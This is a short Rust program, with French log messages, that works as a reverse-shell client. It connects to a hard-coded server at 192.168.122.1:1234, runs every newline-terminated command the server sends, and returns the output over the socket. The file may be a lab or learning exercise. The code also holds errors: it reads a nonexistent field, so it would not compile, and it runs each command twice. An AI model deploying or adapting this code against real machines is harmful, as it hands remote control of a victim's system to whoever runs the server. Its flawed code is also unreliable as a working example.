use std::net::TcpStream;
use std::io::{Write, Read};
use std::process::Command;

fn execute_command(command: String) -> Vec<u8> {
    println!("message reçu : {}", command);
    let test : Vec<&str> = command.split(' ').collect();
    let mut command_exec = Command::new(test[0]);

    for i in test.iter().skip(1) {
        command_exec.arg(i);
    }
    
    command_exec.spawn().expect("process failed to execute");
    let command_res = command_exec.output().unwrap().stdout;
    let stdout = String::from_utf8(command_res.clone()).unwrap();
    println!("{}", stdout);
    println!("Commande finit");

    return command_res;
}


fn receive_message(mut stream: TcpStream) {
let mut msg: Vec<u8> = Vec::new();
    loop {
        let buf = &mut [0; 10];

        match stream.read(buf) {
            Ok(received) => {
                if received < 1 {
                    println!("Server disconnected");
                    return;
                }
                let mut x = 0;

                for c in buf {
                    if x >= received {
                        break;
                    }
                    x += 1;
                    if *c == '\n' as u8 {
                        let command = String::from_utf8(msg.clone()).unwrap();
                        let command_res = execute_command(command);
                        stream.write(&command_res.stdout);
                        msg.clear();
                    } else {
                        msg.push(*c);
                    }
                }
            }
            Err(_) => {
                println!("Server disconnected");
                return;
            }
        }
    }
}

fn main() {
    println!("Tentative de connexion au serveur...");
    match TcpStream::connect("192.168.122.1:1234") {
        Ok(stream) => {
            println!("Connexion au serveur réussi !");
            receive_message(stream);
        }
        Err(e) => {
            println!("La connexion au serveur a échoué : {}", e);
        }
    }
}